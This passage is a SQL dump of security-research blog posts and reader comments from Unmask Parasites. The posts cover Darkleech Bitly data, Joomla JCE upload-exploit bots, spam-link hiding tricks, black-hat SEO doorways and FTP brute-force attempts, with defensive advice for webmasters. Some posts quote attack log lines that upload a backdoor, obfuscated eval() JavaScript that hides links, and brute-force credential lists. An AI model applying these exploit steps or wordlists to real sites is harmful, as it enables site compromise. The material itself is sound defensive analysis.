black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (65, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (66, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (67, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (68, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (69, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (70, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one 